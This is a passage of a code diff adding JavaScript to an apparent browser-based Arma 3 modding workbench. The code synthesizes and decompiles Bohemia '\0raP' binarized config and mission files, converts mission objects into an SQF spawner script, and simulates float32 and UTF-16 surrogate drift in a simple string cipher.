+                // ValueEq Int32: isHardenedx64 = 1;
+                pushByte(1); pushByte(2);
+                pushAsciiz("isHardenedx64");
+                pushUint32(1);
+
+                // ArrayEq: requiredAddons[] = {"A3_Data_F", "A3_Functions_F", 2026};
+                pushByte(2);
+                pushAsciiz("requiredAddons");
+                writeBisCompressedInt(bytes, 3);
+                pushByte(0); pushAsciiz("A3_Data_F");
+                pushByte(0); pushAsciiz("A3_Functions_F");
+                pushByte(2); pushUint32(2026);
+
+                // Write CfgFunctions Class Body
+                const cfgFncBodyOffset = bytes.length;
+                patchUint32(cfgFncPtrPos, cfgFncBodyOffset);
+
+                pushAsciiz("BaseFunctions"); // inherits BaseFunctions
+                writeBisCompressedInt(bytes, 3);
+
+                pushByte(1); pushByte(0);
+                pushAsciiz("tag");
+                pushAsciiz("RV4");
+
+                pushByte(1); pushByte(2);
+                pushAsciiz("preInit");
+                pushUint32(1);
+
+                pushByte(1); pushByte(0);
+                pushAsciiz("file");
+                pushAsciiz("\\x\\rv_protected\\addons\\core\\functions");
+            } else {
+                // Synthesize Binarized Mission.sqm with Object Entities for SQM -> SQF Vehicle Exporter!
+                pushAsciiz("");
+                writeBisCompressedInt(bytes, 3);
+
+                // version = 54;
+                pushByte(1); pushByte(2);
+                pushAsciiz("version");
+                pushUint32(54);
+
+                // class Item0 (B_MRAP_01_F Hunter)
+                pushByte(0);
+                pushAsciiz("Item0");
+                const item0Ptr = bytes.length;
+                pushUint32(0);
+
+                // class Item1 (Land_Cargo_House_V1_F)
+                pushByte(0);
+                pushAsciiz("Item1");
+                const item1Ptr = bytes.length;
+                pushUint32(0);
+
+                const patchUint32 = (pos, val) => {
+                    bytes[pos] = val & 0xFF;
+                    bytes[pos + 1] = (val >>> 8) & 0xFF;
+                    bytes[pos + 2] = (val >>> 16) & 0xFF;
+                    bytes[pos + 3] = (val >>> 24) & 0xFF;
+                };
+
+                // Item0 body
+                patchUint32(item0Ptr, bytes.length);
+                pushAsciiz("");
+                writeBisCompressedInt(bytes, 5);
+                pushByte(1); pushByte(0); pushAsciiz("dataType"); pushAsciiz("Object");
+                pushByte(1); pushByte(0); pushAsciiz("type"); pushAsciiz("B_MRAP_01_hmg_F");
+                pushByte(1); pushByte(2); pushAsciiz("id"); pushUint32(101);
+                pushByte(2); pushAsciiz("position"); writeBisCompressedInt(bytes, 3);
+                pushByte(1); pushFloat32(14624.5);
+                pushByte(1); pushFloat32(17.92);
+                pushByte(1); pushFloat32(16782.25);
+                pushByte(2); pushAsciiz("angles"); writeBisCompressedInt(bytes, 3);
+                pushByte(1); pushFloat32(0.0);
+                pushByte(1); pushFloat32(0.785398); // 45 deg yaw in radians
+                pushByte(1); pushFloat32(0.0);
+
+                // Item1 body
+                patchUint32(item1Ptr, bytes.length);
+                pushAsciiz("");
+                writeBisCompressedInt(bytes, 5);
+                pushByte(1); pushByte(0); pushAsciiz("dataType"); pushAsciiz("Object");
+                pushByte(1); pushByte(0); pushAsciiz("type"); pushAsciiz("Land_BagBunker_Tower_F");
+                pushByte(1); pushByte(2); pushAsciiz("id"); pushUint32(102);
+                pushByte(2); pushAsciiz("position"); writeBisCompressedInt(bytes, 3);
+                pushByte(1); pushFloat32(14635.0);
+                pushByte(1); pushFloat32(17.90);
+                pushByte(1); pushFloat32(16795.8);
+                pushByte(2); pushAsciiz("angles"); writeBisCompressedInt(bytes, 3);
+                pushByte(1); pushFloat32(0.0);
+                pushByte(1); pushFloat32(1.570796); // 90 deg yaw
+                pushByte(1); pushFloat32(0.0);
+            }
+
+            // Patch enum offset at end of stream + write 0 enums
+            const finalEnumOffset = bytes.length;
+            bytes[enumOffsetPos] = finalEnumOffset & 0xFF;
+            bytes[enumOffsetPos + 1] = (finalEnumOffset >>> 8) & 0xFF;
+            bytes[enumOffsetPos + 2] = (finalEnumOffset >>> 16) & 0xFF;
+            bytes[enumOffsetPos + 3] = (finalEnumOffset >>> 24) & 0xFF;
+            pushUint32(0); // 0 trailing enums
+
+            return new Uint8Array(bytes);
+        }
+
+        /**
+         * Client-Side Bohemia Interactive `\0raP` Binary Stream Decompiler
+         */
+        function decompileRapBinaryBuffer(uint8Bytes) {
+            const dv = new DataView(uint8Bytes.buffer, uint8Bytes.byteOffset, uint8Bytes.byteLength);
+            const decoder = new TextDecoder('utf-8');
+            const packetsTrace = [];
+
+            // Verify \0raP magic bytes (0x00, 0x72, 0x61, 0x50)
+            if (uint8Bytes.length < 16 || uint8Bytes[0] !== 0x00 || uint8Bytes[1] !== 0x72 || uint8Bytes[2] !== 0x61 || uint8Bytes[3] !== 0x50) {
+                throw new Error("Invalid binary header: File does not start with Bohemia '\\0raP' (0x00 0x72 0x61 0x50) signature.");
+            }
+
+            let offset = 4;
+            const always0 = dv.getUint32(offset, true); offset += 4;
+            const always8 = dv.getUint32(offset, true); offset += 4;
+            const offsetToEnums = dv.getUint32(offset, true); offset += 4;
+
+            const readCompressedInt = () => {
+                let result = 0;
+                let shift = 0;
+                while (offset < uint8Bytes.length) {
+                    const byte = uint8Bytes[offset++];
+                    result |= (byte & 0x7F) << shift;
+                    if ((byte & 0x80) === 0) break;
+                    shift += 7;
+                }
+                return result;
+            };
+
+            const readAsciiz = () => {
+                let start = offset;
+                while (offset < uint8Bytes.length && uint8Bytes[offset] !== 0) offset++;
+                const str = decoder.decode(uint8Bytes.subarray(start, offset));
+                offset++;
+                return str;
+            };
+
+            const readArrayElements = () => {
+                const count = readCompressedInt();
+                const items = [];
+                for (let i = 0; i < count; i++) {
+                    const subType = uint8Bytes[offset++];
+                    if (subType === 0) {
+                        items.push(`"${readAsciiz()}"`);
+                    } else if (subType === 1) {
+                        const f = dv.getFloat32(offset, true); offset += 4;
+                        items.push(Number(f.toFixed(6)).toString());
+                    } else if (subType === 2) {
+                        const n = dv.getInt32(offset, true); offset += 4;
+                        items.push(n.toString());
+                    } else if (subType === 3) {
+                        items.push(`{${readArrayElements().join(', ')}}`);
+                    }
+                }
+                return items;
+            };
+
+            const parseClassBody = (classOffset, indentLevel = 0) => {
+                offset = classOffset;
+                const inherited = readAsciiz();
+                const numEntries = readCompressedInt();
+                const indent = '    '.repeat(indentLevel);
+                let lines = [];
+                const deferredSubclasses = [];
+
+                for (let e = 0; e < numEntries; e++) {
+                    const pktOffset = offset;
+                    const packetType = uint8Bytes[offset++];
+
+                    if (packetType === 0) {
+                        // RapClass (Subclass)
+                        const subName = readAsciiz();
+                        const bodyPtr = dv.getUint32(offset, true); offset += 4;
+                        packetsTrace.push({ offset: pktOffset, type: '0: RapClass', name: subName, value: `Body @ 0x${bodyPtr.toString(16)}` });
+                        deferredSubclasses.push({ subName, bodyPtr, placeholderIndex: lines.length });
+                        lines.push(null); // placeholder filled after sequential packet header reads
+                    } else if (packetType === 1) {
+                        // ValueEq
+                        const subType = uint8Bytes[offset++];
+                        const propName = readAsciiz();
+                        let formattedVal = '';
+                        let typeLabel = '';
+                        if (subType === 0) {
+                            formattedVal = `"${readAsciiz()}"`;
+                            typeLabel = '1.0: ValueEq (String)';
+                        } else if (subType === 1) {
+                            const f = dv.getFloat32(offset, true); offset += 4;
+                            formattedVal = Number(f.toFixed(6)).toString();
+                            typeLabel = '1.1: ValueEq (Float32)';
+                        } else if (subType === 2) {
+                            const n = dv.getInt32(offset, true); offset += 4;
+                            formattedVal = n.toString();
+                            typeLabel = '1.2: ValueEq (Int32)';
+                        } else if (subType === 4) {
+                            formattedVal = readAsciiz();
+                            typeLabel = '1.4: ValueEq (Var)';
+                        }
+                        packetsTrace.push({ offset: pktOffset, type: typeLabel, name: propName, value: formattedVal });
+                        lines.push(`${indent}${propName} = ${formattedVal};`);
+                    } else if (packetType === 2) {
+                        // ArrayEq
+                        const arrName = readAsciiz();
+                        const elems = readArrayElements();
+                        const valStr = `{${elems.join(', ')}}`;
+                        packetsTrace.push({ offset: pktOffset, type: '2: ArrayEq', name: `${arrName}[]`, value: valStr });
+                        lines.push(`${indent}${arrName}[] = ${valStr};`);
+                    } else if (packetType === 3) {
+                        // ExternClass
+                        const extName = readAsciiz();
+                        packetsTrace.push({ offset: pktOffset, type: '3: ExternClass', name: extName, value: 'external ref' });
+                        lines.push(`${indent}class ${extName};`);
+                    } else if (packetType === 4) {
+                        // DeleteClass
+                        const delName = readAsciiz();
+                        packetsTrace.push({ offset: pktOffset, type: '4: DeleteClass', name: delName, value: 'delete statement' });
+                        lines.push(`${indent}delete ${delName};`);
+                    }
+                }
+
+                // Resolve deferred subclasses recursively
+                for (const sub of deferredSubclasses) {
+                    const savedOffset = offset;
+                    const subResult = parseClassBody(sub.bodyPtr, indentLevel + 1);
+                    const inhClause = subResult.inherited ? `: ${subResult.inherited}` : '';
+                    lines[sub.placeholderIndex] = `${indent}class ${sub.subName}${inhClause} {\n${subResult.bodyText}\n${indent}};`;
+                    offset = savedOffset;
+                }
+
+                return { inherited, bodyText: lines.join('\n') };
+            };
+
+            const root = parseClassBody(16, 0);
+            const headerBanner = `// ============================================================================\n// DECOMPILED BY RV4 \\0raP BINARY DECOMPILER\n// Stream Size: ${uint8Bytes.length} Bytes | Enum Offset: 0x${offsetToEnums.toString(16).toUpperCase()} | Packets: ${packetsTrace.length}\n// ============================================================================\n\n`;
+            return {
+                text: headerBanner + root.bodyText,
+                packets: packetsTrace
+            };
+        }
+
+        function synthesizeAndDecompileSampleRap(kind) {
+            const binary = buildSampleRapBinary(kind);
+            lastSynthesizedRapBytes = binary;
+            renderRapDecompilation(binary, kind === 'config' ? 'config.bin (Synthesized \0raP)' : 'mission.sqm (Synthesized \0raP)');
+            showToast(`Synthesized & decompiled ${binary.length}-byte binary \\0raP stream`, 'emerald');
+        }
+
+        function renderRapDecompilation(uint8Bytes, label) {
+            document.getElementById('rapBinaryMetaBadge').textContent = `${label} (${uint8Bytes.length} B)`;
+            document.getElementById('rapHexView').textContent = formatHexDump(uint8Bytes.subarray(0, Math.min(320, uint8Bytes.length)));
+
+            try {
+                const res = decompileRapBinaryBuffer(uint8Bytes);
+                aceRapOutput.setValue(res.text, -1);
+                document.getElementById('rapPacketCountBadge').textContent = `${res.packets.length} Packets`;
+                document.getElementById('rapPacketTableBody').innerHTML = res.packets.map(p => `
+                    <tr class="hover:bg-rv-surface/50">
+                        <td class="py-1.5 px-3 text-slate-500">0x${p.offset.toString(16).padStart(4, '0').toUpperCase()}</td>
+                        <td class="py-1.5 px-3 text-amber-300">${p.type}</td>
+                        <td class="py-1.5 px-3 text-white font-semibold">${p.name}</td>
+                        <td class="py-1.5 px-3 text-cyan-300 truncate max-w-[200px]">${p.value}</td>
+                    </tr>
+                `).join('');
+            } catch (err) {
+                // If user uploaded plaintext .sqm, display it directly so they can run SQM -> SQF Exporter
+                const text = new TextDecoder('utf-8').decode(uint8Bytes);
+                aceRapOutput.setValue(text, -1);
+                document.getElementById('rapPacketCountBadge').textContent = `Plaintext SQM/CPP`;
+                document.getElementById('rapPacketTableBody').innerHTML = `<tr><td colspan="4" class="py-3 px-3 text-amber-300">Loaded plaintext file (not binarized \\0raP). Click "SQM Entities -> createSimpleObject SQF" to transpile objects!</td></tr>`;
+            }
+        }
+
+        function handleRapBinaryUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const u8 = new Uint8Array(e.target.result);
+                lastSynthesizedRapBytes = u8;
+                renderRapDecompilation(u8, file.name);
+                showToast(`Loaded ${file.name} (${u8.length} bytes)`, 'cyan');
+            };
+            reader.readAsArrayBuffer(file);
+        }
+
+        function downloadSampleRapBinary() {
+            if (!lastSynthesizedRapBytes) {
+                lastSynthesizedRapBytes = buildSampleRapBinary('config');
+            }
+            downloadBlob(lastSynthesizedRapBytes, 'rv4_sample_config.bin', 'application/octet-stream');
+        }
+
+        /**
+         * SQM -> SQF Vehicle & SimpleObject Exporter
+         * Parses Mission SQM Object classes and generates setPosWorld + setVectorDirAndUp SQF
+         */
+        function transpileSqmToSqfVehicles() {
+            let src = aceRapOutput.getValue();
+            if (!/dataType\s*=\s*"Object"/i.test(src)) {
+                synthesizeAndDecompileSampleRap('sqm');
+                src = aceRapOutput.getValue();
+            }
+
+            const itemRegex = /class\s+Item\d+\s*\{([\s\S]*?)\};/g;
+            let match;
+            const objects = [];
+
+            while ((match = itemRegex.exec(src)) !== null) {
+                const body = match[1];
+                if (!/dataType\s*=\s*"Object"/i.test(body)) continue;
+                const typeMatch = body.match(/\btype\s*=\s*"([^"]+)"\s*;/i);
+                const posMatch = body.match(/\bposition\[\]\s*=\s*\{([^}]+)\}\s*;/i);
+                const angMatch = body.match(/\bangles\[\]\s*=\s*\{([^}]+)\}\s*;/i);
+
+                if (typeMatch && posMatch) {
+                    // Note: Arma 3 SQM stores position as [X, Z_ASL, Y] and angles in radians [pitch, yaw, roll]
+                    const posParts = posMatch[1].split(',').map(n => parseFloat(n.trim()));
+                    const angParts = angMatch ? angMatch[1].split(',').map(n => parseFloat(n.trim())) : [0, 0, 0];
+                    objects.push({
+                        type: typeMatch[1],
+                        x: posParts[0] || 0,
+                        z: posParts[1] || 0,
+                        y: posParts[2] || 0,
+                        yawRad: angParts[1] || 0
+                    });
+                }
+            }
+
+            let sqf = `// ============================================================================\n`;
+            sqf += `// RV4 SQM -> HIGH-PERFORMANCE SQF OBJECT SPAWNER (${objects.length} Entities)\n`;
+            sqf += `// Converts SQM [X, Z_ASL, Y] + Radian Angles -> World [X, Y, Z_ASL] + VectorDir\n`;
+            sqf += `// ============================================================================\n`;
+            sqf += `if (!isServer) exitWith {};\n\n`;
+            sqf += `private _spawnList = [\n`;
+            objects.forEach((o, i) => {
+                const vDirX = Number(Math.sin(o.yawRad).toFixed(4));
+                const vDirY = Number(Math.cos(o.yawRad).toFixed(4));
+                sqf += `    ["${o.type}", [${o.x}, ${o.y}, ${o.z}], [[${vDirX}, ${vDirY}, 0], [0, 0, 1]]]${i < objects.length - 1 ? ',' : ''}\n`;
+            });
+            sqf += `];\n\n`;
+            sqf += `{\n    _x params ["_class", "_posWorld", "_vecDirUp"];\n`;
+            sqf += `    private _obj = createVehicle [_class, [0, 0, 0], [], 0, "CAN_COLLIDE"];\n`;
+            sqf += `    _obj setPosWorld _posWorld;\n`;
+            sqf += `    _obj setVectorDirAndUp _vecDirUp;\n`;
+            sqf += `} forEach _spawnList;`;
+
+            aceRapOutput.setValue(sqf, -1);
+            showToast(`Transpiled ${objects.length} SQM entities into server-side SQF spawner`, 'emerald');
+        }
+
+        function copyRapEditorContent() {
+            copyTextToClipboard(aceRapOutput.getValue(), 'Decompiled Output');
+        }
+
+        function sendRapToStudio() {
+            const val = aceRapOutput.getValue();
+            aceStudioInput.setValue(val, -1);
+            switchWorkbench('studio');
+            updateStudioTelemetry();
+            runStaticLinter();
+            showToast('Transferred buffer to SQF Studio', 'amber');
+        }
+
+        /*************************************************************************
+         * 6. WORKBENCH 4: INTERACTIVE IEEE-754 FLOAT32 DRIFT & SURROGATE SIMULATOR
+         *************************************************************************/
+        function runFloat32DriftSimulation() {
+            const str = document.getElementById('driftTestString').value || 'player';
+            const key = parseFloat(document.getElementById('driftTestMultiplier').value) || 15843;
+            const rc4Bytes = rc4Drop256Transform(Array.from(str).map(c => c.charCodeAt(0) & 0xFF), "rv4_key");
+
+            let surrogateFailures = 0;
+            let float32Failures = 0;
+            const rows = [];
+
+            // Large multiplier simulating 2016 Steam64 UID or compounded key multiplication
+            const largeFloatKey = Math.fround(7656119);
+
+            for (let i = 0; i < Math.min(str.length, 40); i++) {
+                const ch = str[i];
+                const code = str.charCodeAt(i);
+
+                // 1. 2016 SScryptkeytoStringRandom: (code * code) + key
+                const shiftedCp = (code * code) + key;
+                const isSurrogate = (shiftedCp >= 0xD800 && shiftedCp <= 0xDFFF);
+                const isOverflow = shiftedCp > 0xFFFF;
+                if (isSurrogate || isOverflow) surrogateFailures++;
+
+                // 2. Float32 (Math.fround) precision drift test when multiplied by large key
+                const f32Encrypted = Math.fround(Math.fround(code * code) * largeFloatKey + 3);
+                const f32Decrypted = Math.round(Math.sqrt(Math.fround(f32Encrypted / largeFloatKey)));
+                const drifted = f32Decrypted !== code;
+                if (drifted) float32Failures++;
+
+                const statusBadge = isSurrogate
+                    ? `<span class="px-1.5 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40">CRASH: UTF-16 Surrogate (0x${shiftedCp.toString(16).toUpperCase()})</span>`
+                    : isOverflow
+                    ? `<span class="px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40">TRUNCATED: &gt; 0xFFFF (0x${shiftedCp.toString(16).toUpperCase()})</span>`
+                    : `<span class="text-slate-400">0x${shiftedCp.toString(16).toUpperCase()} (${shiftedCp})</span>`;
+
+                const driftBadge = drifted
+                    ? `<span class="text-red-400 font-bold">'${ch}' (${code}) &rarr; '${String.fromCharCode(f32Decrypted)}' (${f32Decrypted}) [DRIFT!]</span>`
+                    : `<span class="text-slate-400">Exact (${f32Decrypted})</span>`;
+
+                rows.push(`<tr class="hover:bg-rv-surface/50">
+                    <td class="py-1.5 px-3 text-white font-bold">'${ch === ' ' ? '&nbsp;' : ch}'</td>
+                    <td class="py-1.5 px-3 text-slate-400">${code}</td>
+                    <td class="py-1.5 px-3 text-amber-300">${shiftedCp}</td>
+                    <td class="py-1.5 px-3">${statusBadge}</td>
+                    <td class="py-1.5 px-3">${driftBadge}</td>
+                    <td class="py-1.5 px-3 text-emerald-400 font-semibold">${rc4Bytes[i]} (Safe Int)</td>
+                </tr>`);
+            }
+
+            document.getElementById('floatSimTableBody').innerHTML = rows.join('');
+            document.getElementById('simSummaryUnicode').textContent = surrogateFailures > 0
+                ? `${surrogateFailures} Corrupted Codepoints Detected`
+                : `0 Surrogates at Key=${key} (Try Key=46000)`;
+            document.getElementById('simSummaryFloat32').textContent = `${float32Failures} Float32 Mantissa Rounding Collisions`;
+        }
+
+        /*************************************************************************
+         * 7. WINDOW ONLOAD BOOTSTRAP
+         *************************************************************************/
+        window.onload = function () {
+            // Initialize Ace Editors across all workbenches
+            aceStudioInput = initAceEditor("aceStudioInput", STUDIO_PRESETS.sqf_macros);
+            aceStudioOutput = initAceEditor("aceStudioOutput", "");
+            aceObfInput = initAceEditor("aceObfInput", vfsFiles[activeVfsIndex].content);
+            aceObfOutput = initAceEditor("aceObfOutput", "");
+            aceRapOutput = initAceEditor("aceRapOutput", "");
+
+            // Live telemetry & linter hooks
+            aceStudioInput.session.on('change', () => {
+                updateStudioTelemetry();
+            });
+            aceObfInput.session.on('change', () => {
+                if (vfsFiles[activeVfsIndex]) {
+                    vfsFiles[activeVfsIndex].content = aceObfInput.getValue();
+                }
+            });
+
+            // Run initial passes so every workbench is pre-populated and ready
+            runStudioOperation('beautify');
+            renderVfsFileList();
+            runHardenedObfuscator();
+            synthesizeAndDecompileSampleRap('config');
+            runFloat32DriftSimulation();
+        };
+    </script>
 </body>
-
 </html>
